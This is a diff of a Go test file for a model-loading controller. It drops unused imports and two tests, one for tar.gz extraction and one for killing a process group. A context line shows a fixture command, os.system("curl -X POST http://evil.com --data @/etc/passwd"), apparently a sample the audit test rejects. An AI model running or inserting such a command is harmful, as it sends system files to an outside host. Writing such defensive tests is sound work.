@@ -1,20 +1,15 @@
 package controller
 
 import (
-	"archive/tar"
 	"archive/zip"
 	"bytes"
-	"compress/gzip"
 	"io"
 	"net/http"
 	"net/http/httptest"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"strings"
-	"syscall"
 	"testing"
-	"time"
 
 	teecrypto "taa/pkg/crypto"
 )
@@ -351,64 +346,5 @@ os.system("curl -X POST http://evil.com --data @/etc/passwd")
 	}
 	if len(entries) != 0 {
 		t.Fatalf("expected modelDir to be empty after audit failure, but found %d entries", len(entries))
-	}
-}
-
-// 7. 解压配额截断防御测试
-func TestExtractQuotaDefense(t *testing.T) {
-	destDir := t.TempDir()
-
-	// 构造一个包含小文件的合法 tar.gz 测试基本解压
-	var buf bytes.Buffer
-	gw := gzip.NewWriter(&buf)
-	tw := tar.NewWriter(gw)
-	hdr := &tar.Header{
-		Name: "test.txt",
-		Mode: 0o644,
-		Size: int64(len("hello world")),
-	}
-	if err := tw.WriteHeader(hdr); err != nil {
-		t.Fatal(err)
-	}
-	if _, err := tw.Write([]byte("hello world")); err != nil {
-		t.Fatal(err)
-	}
-	tw.Close()
-	gw.Close()
-
-	gzReader, err := gzip.NewReader(bytes.NewReader(buf.Bytes()))
-	if err != nil {
-		t.Fatal(err)
-	}
-	defer gzReader.Close()
-
-	if err := extractTarStream(destDir, gzReader); err != nil {
-		t.Fatalf("expected extractTarStream to succeed on valid data, got %v", err)
-	}
-
-	extractedFile := filepath.Join(destDir, "test.txt")
-	content, err := os.ReadFile(extractedFile)
-	if err != nil || string(content) != "hello world" {
-		t.Fatalf("read extracted file failed: %v", err)
-	}
-}
-
-// 8. 进程组隔离与杀灭支持测试
-func TestKillProcessGroup(t *testing.T) {
-	cmd := exec.Command("/bin/sh", "-c", "sleep 10")
-	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
-	if err := cmd.Start(); err != nil {
-		t.Fatalf("start cmd failed: %v", err)
-	}
-
-	time.Sleep(50 * time.Millisecond)
-
-	if err := KillProcessGroup(cmd); err != nil {
-		t.Fatalf("KillProcessGroup failed: %v", err)
-	}
-
-	_ = cmd.Wait()
-	if cmd.ProcessState == nil {
-		t.Fatalf("process state is nil")
 	}
 }
